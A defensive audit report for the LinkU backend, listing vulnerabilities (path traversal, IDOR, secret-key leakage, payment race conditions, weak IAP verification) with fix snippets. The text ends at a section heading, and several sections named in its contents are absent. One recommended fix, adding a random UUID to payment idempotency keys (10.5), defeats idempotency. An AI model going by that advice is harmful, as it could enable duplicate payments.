# LinkU Backend Audit Report - 2026-02-09

> **Purpose**: This document provides a comprehensive list of bugs, security vulnerabilities, and optimization opportunities in the LinkU backend. Each item includes the file path, line numbers, severity, description, and a concrete fix guide so that an AI coding assistant can implement the changes.

---

## Table of Contents

1. [CRITICAL - Security Vulnerabilities](#1-critical---security-vulnerabilities)
2. [CRITICAL - Financial / Payment Issues](#2-critical---financial--payment-issues)
3. [HIGH - Authentication & Session Management](#3-high---authentication--session-management)
4. [HIGH - Race Conditions & Concurrency](#4-high---race-conditions--concurrency)
5. [HIGH - Code Bugs (Runtime Errors)](#5-high---code-bugs-runtime-errors)
6. [HIGH - Performance (N+1 Queries & Memory)](#6-high---performance-n1-queries--memory)
7. [MEDIUM - Input Validation & Error Handling](#7-medium---input-validation--error-handling)
8. [MEDIUM - Data Integrity & Schema Issues](#8-medium---data-integrity--schema-issues)
9. [MEDIUM - Resource Management & Cleanup](#9-medium---resource-management--cleanup)
10. [LOW - Code Quality & Best Practices](#10-low---code-quality--best-practices)
11. [CRITICAL - Admin Panel Security](#11-critical---admin-panel-security)
12. [CRITICAL - SSR & Cache Security](#12-critical---ssr--cache-security)
13. [CRITICAL - Multi-Participant & Coupon/Points](#13-critical---multi-participant--couponpoints)
14. [HIGH - File Upload & Image Security](#14-high---file-upload--image-security)
15. [HIGH - Async/Sync Issues & Dependency Injection](#15-high---asyncsync-issues--dependency-injection)
16. [HIGH - Student Verification & OAuth](#16-high---student-verification--oauth)

---

## 1. CRITICAL - Security Vulnerabilities

### 1.1 SECRET_KEY Leakage in Debug Endpoint

- **File**: `app/routers.py` ~line 679-682
- **Issue**: Debug endpoint returns partial SECRET_KEY value, key length, and whether it's the default key.
- **Risk**: Enables brute-force attacks on JWT token forgery.
- **Fix**:
  ```python
  # REMOVE these lines entirely from the debug response:
  # "current_secret_key": Config.SECRET_KEY[:20] + "...",
  # "secret_key_length": len(Config.SECRET_KEY),
  # "is_default_secret": Config.SECRET_KEY == "change-this-secret-key-in-production"
  ```

### 1.2 Hardcoded Default Credentials in Config

- **File**: `app/config.py` lines 16-22, `app/database.py` lines 16-21
- **Issue**: Default DATABASE_URL contains `postgres:password@localhost`. SECRET_KEY defaults to `"change-this-secret-key-in-production"`. These are duplicated in database.py.
- **Risk**: If env vars aren't set, production could run with default credentials.
- **Fix**:
  1. In `config.py`: make SECRET_KEY and DATABASE_URL **required** (raise error on startup if not set).
  2. In `database.py`: import DATABASE_URL from `config.py` instead of duplicating `os.getenv()`.
  ```python
  # config.py
  SECRET_KEY = os.getenv("SECRET_KEY")
  if not SECRET_KEY:
      raise RuntimeError("SECRET_KEY environment variable is required")

  DATABASE_URL = os.getenv("DATABASE_URL")
  if not DATABASE_URL:
      raise RuntimeError("DATABASE_URL environment variable is required")
  ```

### 1.3 Path Traversal via `glob()` with User Input

- **File**: `app/routers.py` ~lines 2525, 3420, 2854, 2937
- **Issue**: `file_id` is used directly in `glob(f"{file_id}.*")`. If `file_id` contains `../../../`, attacker can read arbitrary files.
- **Fix**:
  ```python
  import re
  if not re.match(r'^[a-zA-Z0-9_-]+$', file_id):
      raise HTTPException(status_code=400, detail="Invalid file ID")
  ```

### 1.4 Missing IDOR Protection on Image URL Generation

- **File**: `app/routers.py` ~lines 10017-10190
- **Issue**: `/messages/generate-image-url` does NOT verify the current user has access to the message before generating a signed URL.
- **Fix**: After loading the message, verify that `current_user.id` is either the message sender, the task poster, or the task taker before returning a URL.

### 1.5 APNs Private Key Stored in Predictable Temp File

- **File**: `app/push_notification_service.py` lines 156-171
- **Issue**: APNs key written to `/tmp/apns_key.p8` (predictable path, shared temp dir, race condition before chmod).
- **Fix**:
  ```python
  import tempfile
  fd, temp_key_file = tempfile.mkstemp(suffix='.p8')
  try:
      os.chmod(temp_key_file, 0o600)
      with os.fdopen(fd, 'w') as f:
          f.write(key_content)
  except:
      os.close(fd)
      raise
  # Register cleanup on shutdown
  import atexit
  atexit.register(lambda: os.path.exists(temp_key_file) and os.unlink(temp_key_file))
  ```

### 1.6 IAP JWS Signature Verification Can Be Disabled in Production

- **File**: `app/iap_verification_service.py` lines 43, 81-83
- **Issue**: If `ENABLE_IAP_FULL_VERIFICATION` env var is missing or set to "false", JWS signatures are NOT verified. Attacker can submit forged IAP receipts.
- **Fix**: In production (non-sandbox), ENFORCE verification:
  ```python
  if not self.enable_full_verification and not self.use_sandbox:
      raise RuntimeError("IAP signature verification MUST be enabled in production")
  ```

### 1.7 Missing x5c Certificate Chain Validation in IAP

- **File**: `app/iap_verification_service.py` lines 119-135
- **Issue**: x5c certificate is extracted and used for signature verification, but the certificate is NOT validated against Apple's known root CAs. Attacker can substitute their own certificate.
- **Fix**: Validate the certificate issuer contains "Apple" and verify the chain against Apple's root certificate.

---

## 2. CRITICAL - Financial / Payment Issues

### 2.1 Race Condition in Transfer Processing (Double Payment)

- **File**: `app/payment_transfer_service.py` lines 523-536
- **Issue**: `process_pending_transfers()` updates Task `is_confirmed` and `escrow_amount` WITHOUT acquiring a row lock. Two concurrent calls can both execute the same transfer.
- **Fix**:
  ```python
  # Before reading task state, acquire lock:
  from sqlalchemy import select as sa_select
  locked_task = db.execute(
      sa_select(models.Task).where(models.Task.id == transfer_record.task_id).with_for_update()
  ).scalar_one_or_none()
  # Then proceed with transfer validation using locked_task
  ```

### 2.2 Missing Idempotency in Transfer Record Creation

- **File**: `app/payment_transfer_service.py` lines 35-80
- **Issue**: `create_transfer_record()` has no idempotency check. If called twice with same parameters, two transfer records are created and both may execute.
- **Fix**: Before creating, check for existing pending/succeeded transfer:
  ```python
  existing = db.query(models.PaymentTransfer).filter(
      models.PaymentTransfer.task_id == task_id,
      models.PaymentTransfer.taker_id == taker_id,
      models.PaymentTransfer.status.in_(["pending", "retrying", "succeeded"])
  ).first()
  if existing:
      return existing
  ```

### 2.3 Financial Precision Loss in Refund Calculations

- **File**: `app/refund_service.py` lines 206-236
- **Issue**: Multiple `float` -> `str` -> `Decimal` conversions compound rounding errors. Result: 1-3 pence discrepancies per refund.
- **Fix**: Use `Decimal` throughout the entire calculation chain. Never convert to `float` until final storage:
  ```python
  # Replace: new_escrow_amount = remaining_amount - Decimal(str(application_fee))
  # With:    application_fee_pence = calculate_application_fee_pence(int(remaining_amount * 100))
  #          application_fee_decimal = Decimal(application_fee_pence) / Decimal('100')
  #          new_escrow_amount = remaining_amount - application_fee_decimal
  ```

### 2.4 Race Condition in Refund Processing (Stale Data)

- **File**: `app/refund_service.py` lines 154-194
- **Issue**: Task state is read BEFORE acquiring `SELECT FOR UPDATE` lock. Between read and lock, another thread could change escrow amounts.
- **Fix**: Acquire lock FIRST, then read all financial data from the locked row.

### 2.5 Missing Idempotency in Refund-Triggered Transfer

- **File**: `app/refund_service.py` lines 248-325
- **Issue**: After partial refund, `create_transfer_record()` is called without checking if a transfer already exists.
- **Fix**: Same pattern as 2.2 - check for existing transfer before creation.

### 2.6 Non-Atomic Webhook Payment Processing

- **File**: `app/routers.py` ~lines 6114-6348
- **Issue**: Multiple intermediate `db.commit()` calls break transaction atomicity. If the final commit fails, flea market item is marked sold but task isn't updated.
- **Fix**: Use a single transaction with savepoints:
  ```python
  try:
      # All operations here
      db.commit()  # Single commit at end
  except:
      db.rollback()
      raise
  ```

### 2.7 Unvalidated Metadata Amounts in Stripe Webhooks

- **File**: `app/routers.py` ~lines 6072-6078, 6259
- **Issue**: `application_fee` from Stripe webhook metadata is used for financial calculations without validation against backend-calculated values.
- **Fix**: Always recalculate fees using backend logic; use metadata only as a cross-check:
  ```python
  calculated_fee = calculate_application_fee(task_amount_pence)
  metadata_fee = int(metadata.get("application_fee", 0))
  if metadata_fee != calculated_fee:
      logger.warning(f"Fee mismatch: metadata={metadata_fee}, calculated={calculated_fee}")
  application_fee_pence = calculated_fee  # Always use calculated value
  ```

### 2.8 Invitation Code Race Condition (Double Use)

- **File**: `app/routers.py` ~lines 463-472
- **Issue**: Non-atomic GET + DELETE of invitation code in Redis. Two concurrent registrations can both read and use the same code.
- **Fix**: Use Redis GETDEL (6.2+) or a Lua script for atomic get-and-delete:
  ```python
  # Option 1: GETDEL
  invitation_code_id_str = redis_client.getdel(invitation_code_key)

  # Option 2: Lua script
  lua_script = "local v = redis.call('GET', KEYS[1]); redis.call('DEL', KEYS[1]); return v"
  invitation_code_id_str = redis_client.eval(lua_script, 1, invitation_code_key)
  ```

---

## 3. HIGH - Authentication & Session Management

### 3.1 Refresh Token Exposed in Response Body

- **File**: `app/secure_auth_routes.py` lines 223, 346, 405, 1626, 1853
- **Issue**: Mobile endpoints return `refresh_token` in the JSON response body, making it interceptable.
- **Fix**: Return refresh tokens ONLY in HTTP-only, secure cookies:
  ```python
  response.set_cookie(
      key="refresh_token",
      value=refresh_token,
      httponly=True,
      secure=True,
      samesite="strict",
      max_age=30*24*3600
  )
  # Remove refresh_token from response_data dict
  ```

### 3.2 Weak Device Fingerprinting (Only User-Agent)

- **File**: `app/secure_auth.py` lines 540-580
- **Issue**: Device fingerprint uses only User-Agent hash truncated to 16 chars. Easily spoofed, high collision rate.
- **Fix**: Include additional signals:
  ```python
  def get_device_fingerprint(request: Request) -> str:
      components = [
          request.headers.get("user-agent", ""),
          request.headers.get("accept-language", ""),
          request.headers.get("accept-encoding", ""),
          request.client.host if request.client else "",
      ]
      device_string = "|".join(components)
      return hashlib.sha256(device_string.encode()).hexdigest()[:32]  # 32 chars = 128 bits
  ```

### 3.3 Session Fingerprint Similarity Threshold Too Low

- **File**: `app/secure_auth.py` lines 753-788
- **Issue**: Mobile fingerprint similarity threshold is 0.4 (40% match required). Attacker can differ 60% and still pass.
- **Fix**: Increase thresholds: mobile=0.7, web=0.85. Add rate limiting per session_id for fingerprint mismatches.

### 3.4 No Brute Force Protection on Verification Codes

- **File**: `app/secure_auth_routes.py` lines 1370-1442, 1640-1680
- **Issue**: 6-digit verification code (1M combinations) can be brute-forced without per-phone/email attempt limits.
- **Fix**: Add Redis-based rate limiting:
  ```python
  attempt_key = f"verify_attempt:{phone_or_email}"
  attempts = redis_client.incr(attempt_key)
  if attempts == 1:
      redis_client.expire(attempt_key, 900)  # 15 min window
  if attempts > 5:
      raise HTTPException(status_code=429, detail="Too many attempts. Try again in 15 minutes.")
  ```

### 3.5 iOS Session TTL Too Long (1 Year)

- **File**: `app/secure_auth.py` lines 197-199, 309-312
- **Issue**: iOS sessions are set to never expire (365 days). Compromised tokens last a year.
- **Fix**: Reduce to 30 days, with mandatory re-authentication every 7 days:
  ```python
  expire_hours = 30 * 24  # 30 days instead of 365
  ```

### 3.6 No Session Fixation Protection

- **File**: `app/secure_auth_routes.py` lines 241-242
- **Issue**: Session refresh reuses the same session_id instead of generating a new one. Attacker can maintain a stolen session indefinitely.
- **Fix**: Generate new session_id on refresh, invalidate old one.

### 3.7 CSRF Token Has No Expiration

- **File**: `app/csrf.py` lines 138-153
- **Issue**: CSRF tokens are valid indefinitely. Replay attacks possible with captured tokens.
- **Fix**: Store token creation timestamp in Redis, expire after 30 minutes:
  ```python
  redis_client.setex(f"csrf:{token}", 1800, "1")  # 30 min TTL
  # During validation:
  if not redis_client.exists(f"csrf:{token}"):
      return False  # Token expired
  ```

### 3.8 Account Enumeration via Different Error Messages

- **File**: `app/secure_auth_routes.py` lines 77-99
- **Issue**: Login returns "User not found" vs "Invalid password" - reveals whether account exists.
- **Fix**: Use identical error message for both cases: `"Invalid credentials"`.

### 3.9 Auto-Account Creation Without Friction

- **File**: `app/secure_auth_routes.py` lines 1454-1521, 1692-1749
- **Issue**: Phone/email verification auto-creates accounts without CAPTCHA or additional verification.
- **Fix**: Add CAPTCHA requirement for new account creation, add 2-second delay to prevent mass registration.

---

## 4. HIGH - Race Conditions & Concurrency

### 4.1 Task Accept Race Condition (TOCTOU)

- **File**: `app/routers.py` ~lines 1676-1677
- **Issue**: Deadline check happens BEFORE `accept_task()`. Between check and accept, deadline could pass or another user could accept.
- **Fix**: Move deadline check INSIDE `accept_task()` using `SELECT FOR UPDATE`.

### 4.2 Flea Market Double Purchase

- **File**: `app/flea_market_routes.py` ~lines 1390, 1556-1560
- **Issue**: Check for `sold_task_id IS NULL` and creation of purchase task is NOT atomic. Two users can buy the same item simultaneously.
- **Fix**: Use `SELECT FOR UPDATE`:
  ```python
  locked_item = db.execute(
      select(FleaMarketItem)
      .where(FleaMarketItem.id == item_id, FleaMarketItem.sold_task_id.is_(None))
      .with_for_update()
  ).scalar_one_or_none()
  if not locked_item:
      raise HTTPException(409, "Item already sold")
  ```

### 4.3 Points Refund Race Condition

- **File**: `app/routers.py` ~lines 11217-11241
- **Issue**: Activity deletion triggers points refund without transaction lock. Concurrent deletions can double-refund.
- **Fix**: Use `SELECT FOR UPDATE` on the activity before processing refund.

### 4.4 Application Approval Race Condition in Webhooks

- **File**: `app/routers.py` ~lines 6146-6173
- **Issue**: In payment webhook, application approval loop updates `other_applications` without lock. Two webhooks can approve different applications simultaneously.
- **Fix**: Extend `SELECT FOR UPDATE` to TaskApplication queries.

### 4.5 WebSocket Manager Task Creation Race

- **File**: `app/websocket_manager.py` lines 94-98
- **Issue**: `_cleanup_task` and `_heartbeat_task` creation checks are not thread-safe. Multiple concurrent connections can create duplicate background tasks.
- **Fix**: Use `asyncio.Lock` for task creation check.

---

## 5. HIGH - Code Bugs (Runtime Errors)

### 5.1 Missing Import in WebSocket Manager

- **File**: `app/websocket_manager.py` lines 55-56
- **Issue**: `format_iso_utc()` is called but never imported. `get_stats()` will crash with `NameError`.
- **Fix**: Add at top of file:
  ```python
  from app.utils.time_utils import format_iso_utc
  ```

### 5.2 Duplicate Code Block in Celery Tasks (Double Execution)

- **File**: `app/celery_tasks.py` lines 507-523
- **Issue**: Entire `update_all_users_statistics_task` function body is duplicated. The second copy runs OUTSIDE the distributed lock protection.
- **Fix**: Delete the duplicated code block (lines 507-523). Ensure only one function body exists within the lock.

### 5.3 Hardcoded localhost URLs in Payment Callbacks

- **File**: `app/routers.py` ~lines 5898-5899
- **Issue**: `success_url=f"http://localhost:8000/api/users/tasks/{task_id}/pay/success"` hardcoded.
- **Fix**: Replace with config-based URL:
  ```python
  success_url=f"{Config.BASE_URL}/api/users/tasks/{task_id}/pay/success"
  ```

---

## 6. HIGH - Performance (N+1 Queries & Memory)

### 6.1 N+1 Query in `update_all_users_statistics()`

- **File**: `app/main.py` lines 706-715
- **Issue**: Fetches ALL users with `.all()`, then runs individual `update_user_statistics()` for each user.
- **Fix**: Use batch processing with pagination:
  ```python
  page_size = 100
  offset = 0
  while True:
      users = db.query(User.id).limit(page_size).offset(offset).all()
      if not users:
          break
      for user_id_tuple in users:
          crud.update_user_statistics(db, str(user_id_tuple[0]))
      offset += page_size
  ```

### 6.2 N+1 Query in Task Translation Fetching

- **File**: `app/routers.py` ~lines 1367-1375
- **Issue**: For each task_id, two queries fetch English and Chinese translations separately.
- **Fix**: Batch query:
  ```python
  translations = db.query(TaskTranslation).filter(
      TaskTranslation.task_id.in_(task_ids),
      TaskTranslation.field == 'title'
  ).all()
  translations_dict = {(t.task_id, t.language): t.translated_text for t in translations}
  ```

### 6.3 N+1 Query in Flea Market Favorites Count

- **File**: `app/flea_market_routes.py` ~lines 399-403
- **Issue**: For each item in listing, runs separate query to count favorites.
- **Fix**: Batch query with GROUP BY:
  ```python
  item_ids = [item.id for item in items]
  counts = await db.execute(
      select(FleaMarketFavorite.item_id, func.count())
      .where(FleaMarketFavorite.item_id.in_(item_ids))
      .group_by(FleaMarketFavorite.item_id)
  )
  count_dict = dict(counts.all())
  ```

### 6.4 N+1 Query in Task Chat Unread Count

- **File**: `app/task_chat_routes.py` lines 248-283
- **Issue**: For each task, separate query counts unread messages.
- **Fix**: Batch query with GROUP BY or cache unread counts in Redis.

### 6.5 N+1 Query in Expert Listing

- **File**: `app/routers.py` ~lines 11517-11537
- **Issue**: For each expert, up to 2 additional queries if `completion_rate == 0.0`.
- **Fix**: Pre-calculate completion rates or use subquery.

### 6.6 All-Users Query Without Pagination in Cleanup

- **File**: `app/crud.py` line 3623
- **Issue**: `db.query(models.User).all()` loads entire user table into memory.
- **Fix**: Use paginated iteration or `yield_per()`.

### 6.7 Unbounded `.all()` in Scheduled Tasks

- **File**: `app/scheduled_tasks.py` lines 38-43, 50-59, 79-84
- **Issue**: `check_expired_coupons()`, `check_expired_invitation_codes()`, `check_expired_points()` all query without LIMIT.
- **Fix**: Add `.limit(1000)` and process in batches. Follow existing good pattern at line 213.

### 6.8 Unbounded Temp File List in Cleanup

- **File**: `app/cleanup_tasks.py` lines 335-402
- **Issue**: Collects ALL temp files into a list, sorts them, then truncates. Wastes memory with 100K+ files.
- **Fix**: Use a bounded heap (heapq.nsmallest) or process incrementally.

### 6.9 Announcement Sends to All Users in Memory

- **File**: `app/routers.py` ~lines 5834-5870
- **Issue**: `send_announcement_api()` loads all users. Can cause OOM.
- **Fix**: Use `yield_per()` for streaming, or paginate with Celery background task.

### 6.10 Missing Offset Upper Bound on Pagination

- **File**: `app/routers.py` ~lines 2495-2497, 3111-3114
- **Issue**: `offset: int = Query(0, ge=0)` has no upper bound. Attacker can set offset=999999999.
- **Fix**: Add upper bound: `offset: int = Query(0, ge=0, le=100000)` or use cursor-based pagination.

---

## 7. MEDIUM - Input Validation & Error Handling

### 7.1 Bare Exception Handlers Across Codebase

- **Files**: `app/routers.py` (~30 locations), `app/stripe_connect_routes.py` (lines 119, 142, 217), `app/celery_tasks.py` (13 locations), `app/scheduled_tasks.py` (lines 278-301, 514-525)
- **Issue**: `except Exception as e` or bare `except:` silently swallows errors, making debugging impossible.
- **Fix**: Replace with specific exception types. At minimum, always log with `exc_info=True`:
  ```python
  except stripe.error.StripeError as e:
      logger.error(f"Stripe API error: {e}", exc_info=True)
      raise
  except ValueError as e:
      logger.warning(f"Validation error: {e}")
      raise HTTPException(400, str(e))
  ```

### 7.2 Missing Input Length Validation on Keyword Search

- **File**: `app/routers.py` ~lines 11473-11483
- **Issue**: `keyword` parameter used in ILIKE without length limit. Can cause DoS with huge strings.
- **Fix**: Add `keyword: str = Query(..., max_length=200)`.

### 7.3 Unvalidated Metadata Dict Accepted

- **File**: `app/routers.py` ~line 1491
- **Issue**: `metadata: Optional[dict] = Body(None)` accepts any JSON structure.
- **Fix**: Define a Pydantic model with field constraints for metadata.

### 7.4 Missing JSON Parse Error Handling

- **File**: `app/routers.py` ~lines 3540, 11006-11011
- **Issue**: `json.loads()` calls without `try-except` for `JSONDecodeError`.
- **Fix**: Wrap all `json.loads()` in try-except, return 400 on malformed data.

### 7.5 Log Injection Vulnerability

- **File**: `app/security_monitoring.py` lines 38-67
- **Issue**: User-Agent and Referer headers logged without sanitization. Allows CRLF injection.
- **Fix**: Sanitize before logging:
  ```python
  def sanitize_for_log(s: str) -> str:
      return s.replace('\n', '\\n').replace('\r', '\\r')[:500] if s else ""
  ```

### 7.6 Push Notification Reports Success When No Notifications Sent

- **File**: `app/push_notification_service.py` lines 381-389
- **Issue**: Returns `True` even when `success_count == 0` but `failed_tokens` has items.
- **Fix**: Return `False` when `success_count == 0`.

### 7.7 Missing Retry Logic for Transient Push Notification Failures

- **File**: `app/push_notification_service.py` lines 376-379
- **Issue**: Network/timeout errors permanently deactivate device tokens.
- **Fix**: Distinguish between `TokenInvalidError` (deactivate) and transient errors (retry with backoff).

### 7.8 Missing Schema Validation for Task Creation

- **File**: `app/schemas.py` lines 332-357
- **Issue**: `TaskCreate` missing validators: deadline must be in future, location can't be empty string, task_type not validated against enum.
- **Fix**: Add Pydantic validators:
  ```python
  @validator('deadline')
  def deadline_must_be_future(cls, v):
      if v and v < datetime.utcnow():
          raise ValueError('Deadline must be in the future')
      return v
  ```

### 7.9 Missing Cross-Field Validation for User Creation

- **File**: `app/schemas.py` lines 9-32
- **Issue**: Both `email` and `phone` are optional, but at least one is required by the database.
- **Fix**: Add root validator:
  ```python
  @root_validator
  def check_contact_method(cls, values):
      if not values.get('email') and not values.get('phone'):
          raise ValueError('At least one of email or phone is required')
      return values
  ```

---

## 8. MEDIUM - Data Integrity & Schema Issues

### 8.1 Float vs Decimal Mismatch in Task Reward

- **File**: `app/models.py` lines 184-186
- **Issue**: `reward = Column(Float)` and `base_reward = Column(DECIMAL(12, 2))` must stay in sync but use different precision types.
- **Fix**: Change `reward` to `DECIMAL(12, 2)` for consistency:
  ```python
  reward = Column(DECIMAL(12, 2), nullable=False)
  ```

### 8.2 Missing Database Indexes for Common Query Patterns

- **File**: `app/models.py`
- **Issue**: Missing composite indexes for frequently filtered columns.
- **Fix**: Add these indexes:
  ```python
  # On Review model:
  Index("ix_reviews_task_id_anonymous", Review.task_id, Review.is_anonymous)

  # On Notification model:
  Index("ix_notifications_user_type", Notification.user_id, Notification.type)

  # On Message model (for unread counts):
  Index("ix_messages_task_sender_id", Message.task_id, Message.sender_id, Message.id)
  ```

### 8.3 Redundant Default Timestamps

- **File**: `app/models.py` line 245
- **Issue**: `updated_at` has both `default=get_utc_time` AND `server_default=func.now()`. Redundant and can cause mismatches.
- **Fix**: Use only `server_default=func.now()` and `onupdate=func.now()`.

### 8.4 Missing Check Constraints on Time Slot Fields

- **File**: `app/models.py` lines 232-234
- **Issue**: `time_slot_start_time` and `time_slot_end_time` should both be NOT NULL when `is_fixed_time_slot=True`.
- **Fix**: Add database check constraint:
  ```sql
  CHECK (is_fixed_time_slot = 0 OR (time_slot_start_time IS NOT NULL AND time_slot_end_time IS NOT NULL))
  ```

### 8.5 Inconsistent `synchronize_session` in Manual Deletes

- **File**: `app/crud.py` lines 1850-2000
- **Issue**: `delete_task_with_cleanup()` uses inconsistent `synchronize_session` parameter. Some deletes pass `False`, others don't specify.
- **Fix**: Use `synchronize_session=False` consistently for all bulk deletes in the cleanup function.

### 8.6 Notification Transaction Atomicity

- **File**: `app/task_notifications.py` lines 38-90
- **Issue**: Admin notifications commit one-by-one. Partial failure leaves inconsistent state.
- **Fix**: Batch all notification creations, commit once at end.

---

## 9. MEDIUM - Resource Management & Cleanup

### 9.1 Missing DB Rollback in Cleanup Tasks

- **File**: `app/cleanup_tasks.py` lines 227, 253, 279, 998
- **Issue**: `finally` blocks close DB but don't rollback. If exception occurs mid-operation, uncommitted changes may lock rows.
- **Fix**: Add `db.rollback()` before `db.close()` in all finally blocks:
  ```python
  finally:
      try:
          db.rollback()
      except Exception:
          pass
      db.close()
  ```

### 9.2 Blocking File I/O in Async Context

- **File**: `app/cleanup_tasks.py` lines 436-476, 574-604
- **Issue**: Synchronous `pathlib.iterdir()` and `unlink()` in async functions blocks the event loop.
- **Fix**: Use `asyncio.to_thread()`:
  ```python
  await asyncio.to_thread(file_path.unlink)
  ```

### 9.3 WebSocket Connection Lock Dictionary Never Cleaned

- **File**: `app/websocket_manager.py` line 147-149
- **Issue**: `connection_locks` dictionary grows unbounded. Disconnected users' locks remain forever.
- **Fix**: Remove lock entry in `remove_connection()`:
  ```python
  async def remove_connection(self, user_id: str):
      self.connections.pop(user_id, None)
      self.connection_locks.pop(user_id, None)  # Cleanup lock
  ```

### 9.4 Background Task Accumulation on App Reload

- **File**: `app/main.py` lines 602-604
- **Issue**: `_background_cleanup_task` and other global task references can accumulate on hot reload.
- **Fix**: Implement proper task cancellation in shutdown handler:
  ```python
  @app.on_event("shutdown")
  async def shutdown():
      for task in [_background_cleanup_task, _pool_monitor_task]:
          if task and not task.done():
              task.cancel()
              try:
                  await task
              except asyncio.CancelledError:
                  pass
  ```

### 9.5 Heartbeat Loop Missing Shutdown Signal Check

- **File**: `app/main.py` lines 621-676
- **Issue**: `heartbeat_loop()` runs `while True` without checking shutdown flag.
- **Fix**: Add `if is_app_shutting_down(): break` at the top of each loop iteration.

### 9.6 Pool Monitor Memory Leak

- **File**: `app/database.py` lines 217-278
- **Issue**: `start_pool_monitor()` can create multiple monitor tasks if called repeatedly.
- **Fix**: Check if existing task is still running before creating a new one.

### 9.7 Blocking `time.sleep()` in Background Thread

- **File**: `app/main.py` lines 750-753
- **Issue**: `run_background_task()` uses `time.sleep(600)` which won't respond to shutdown signals.
- **Fix**: Replace with event-based waiting:
  ```python
  shutdown_event = threading.Event()
  shutdown_event.wait(timeout=600)  # Wakes immediately on set()
  ```

---

## 10. LOW - Code Quality & Best Practices

### 10.1 Monolithic `routers.py` (12,825 Lines)

- **File**: `app/routers.py`
- **Issue**: Too large to maintain, review, or debug effectively.
- **Fix**: Continue planned migration to `app/routes/` package. Priority order:
  1. Payment/Stripe routes (financial, high risk)
  2. Task CRUD routes
  3. Customer service routes
  4. User management routes
  5. Debug/admin routes

### 10.2 Deprecated `db.query()` Pattern Still in Use

- **File**: `app/crud.py` (widespread)
- **Issue**: Legacy SQLAlchemy 1.x `db.query()` API used alongside new `select()` API.
- **Fix**: Gradually migrate to `select()` API during feature changes. Don't do bulk migration as it's risky.

### 10.3 Hardcoded Values Scattered Across Code

- **Files**: Multiple
- **Issue**: Magic numbers and strings like `evidence_files > 10`, `evidence_files > 5`, `valid_reason_types = [...]`, customer service keywords.
- **Fix**: Create `app/constants.py` entries for all configurable values.

### 10.4 Inconsistent Date/Time Handling

- **Files**: Multiple
- **Issue**: Mix of `datetime.utcnow()` and custom `get_utc_time()`.
- **Fix**: Use `get_utc_time()` everywhere. Add linter rule to flag `datetime.utcnow()`.

### 10.5 Predictable Idempotency Keys

- **File**: `app/routers.py` ~line 3809
- **Issue**: `f"task_complete_{task_id}_{task.taker_id}"` is guessable.
- **Fix**: Include a UUID or timestamp:
  ```python
  idempotency_key = f"task_complete_{task_id}_{task.taker_id}_{uuid.uuid4().hex[:8]}"
  ```

### 10.6 Debug Endpoint Leaks User Data

- **File**: `app/routers.py` ~line 728
- **Issue**: `/debug/check-user-avatar/{user_id}` allows arbitrary user lookup.
- **Fix**: Ensure `require_debug_environment` dependency completely blocks this in production. Consider removing entirely.

### 10.7 Unused Session Cleanup Function

- **File**: `app/main.py` lines 767-774
- **Issue**: `run_session_cleanup_task()` is a no-op that just logs and passes.
- **Fix**: Remove the function and all callers.

### 10.8 Inconsistent Error Message Language

- **File**: `app/routers.py` ~line 10965
- **Issue**: Error messages use Chinese `"、".join(reasons)` without localization.
- **Fix**: Use locale-aware formatting or always return error codes with i18n.

### 10.9 VIP Level String Comparison Without Normalization

- **File**: `app/vip_subscription_service.py` lines 163-164
- **Issue**: `user.user_level != "vip"` without null check or case normalization.
- **Fix**:
  ```python
  current_level = (user.user_level or "").lower()
  if current_level not in ("vip", "super"):
  ```

### 10.10 Cascade Delete Without Safety Checks

- **File**: `app/routers.py` ~lines 11176-11209
- **Issue**: `delete_expert_activity_admin` cascade-deletes related tasks without checking if they're completed/paid.
- **Fix**: Before deleting, verify no tasks are in "paid" or "completed" status. Require explicit confirmation for tasks with financial activity.

---

## 11. CRITICAL - Admin Panel Security

### 11.1 Missing Super-Admin Authorization on Coupon/Points Operations

- **File**: `app/admin_coupon_points_routes.py` lines 49-1435
- **Issue**: All coupon/points APIs use `get_current_admin_secure_sync` which only verifies admin status, NOT role level. Any admin can create coupons, delete coupons with `force` flag, adjust user points up to 100M, and batch-reward points to all users.
- **Risk**: Rogue or compromised admin account can award unlimited points/coupons.
- **Fix**: Add `is_super_admin` check for sensitive operations:
  ```python
  if not current_admin.is_super_admin:
      raise HTTPException(status_code=403, detail="Requires super admin privileges")
  ```
  Apply to: coupon create/delete, points adjust, batch reward, invitation code management.

### 11.2 Batch Reward Can Distribute to ALL Users Without Approval

- **File**: `app/admin_coupon_points_routes.py` lines 1505-1509, 1747-1750
- **Issue**: `target_type == "all"` loads all users and distributes points. Max batch is 10,000 users. Rate limit is only 5 calls/hour. An admin could distribute 50 billion points in one day.
- **Fix**:
  1. Require super-admin for "all" target type.
  2. Add approval workflow for batch operations exceeding threshold (e.g., 1000 points or 100 users).
  3. Send notification to all super-admins when batch reward executed.

### 11.3 Force-Delete Coupons Destroys Audit Trail

- **File**: `app/admin_coupon_points_routes.py` lines 484-488
- **Issue**: `force=True` hard-deletes `UserCoupon`, `CouponRedemption`, and `CouponUsageLog` records with no archive.
- **Fix**: Instead of hard-delete, use soft-delete (set status to "force_deleted"). Or archive to separate table before deleting.

### 11.4 Audit Log IDOR - Admin Can View Other Admins' Logs

- **File**: `app/admin_system_routes.py` line 356
- **Issue**: Any admin can query audit logs for any `admin_id` without scope verification. Regular admin can see super-admin actions.
- **Fix**: Only allow viewing own logs unless super-admin:
  ```python
  if admin_id and admin_id != current_admin.id and not current_admin.is_super_admin:
      raise HTTPException(403, "Cannot view other admin's logs")
  ```

### 11.5 No Array Size Limit on Batch Task Operations

- **File**: `app/admin_task_management_routes.py` lines 236, 289
- **Issue**: `task_ids: list[int]` has no `max_items` constraint. Sending 1M IDs causes DoS.
- **Fix**: Use Pydantic `conlist` or validate length:
  ```python
  task_ids: list[int] = Body(..., max_items=200)
  ```

### 11.6 System Cleanup Queries Missing LIMIT

- **File**: `app/admin_system_routes.py` lines 247-250
- **Issue**: Cleanup queries fetch ALL expired tasks with `.all()`. Can load millions of rows.
- **Fix**: Add `.limit(1000)` and process in batches, or use bulk `.update()`.

### 11.7 Refund Approval Without Permission Level Check

- **File**: `app/admin_refund_routes.py` line 149
- **Issue**: Any admin can approve refunds up to the full task amount without super-admin or 2FA requirement.
- **Fix**: Require super-admin for refunds above threshold (e.g., £100). Add 2FA confirmation for all refund approvals.

### 11.8 Missing Rate Limiting on Admin Read Operations

- **Files**: `admin_task_management_routes.py`, `admin_system_routes.py`, `admin_vip_routes.py`, `admin_user_management_routes.py`
- **Issue**: Admin list/search endpoints have no rate limiting, enabling data scraping.
- **Fix**: Add rate limiting: 100 requests/minute for list endpoints.

---

## 12. CRITICAL - SSR & Cache Security

### 12.1 SSR XSS Vulnerabilities (HTML Injection)

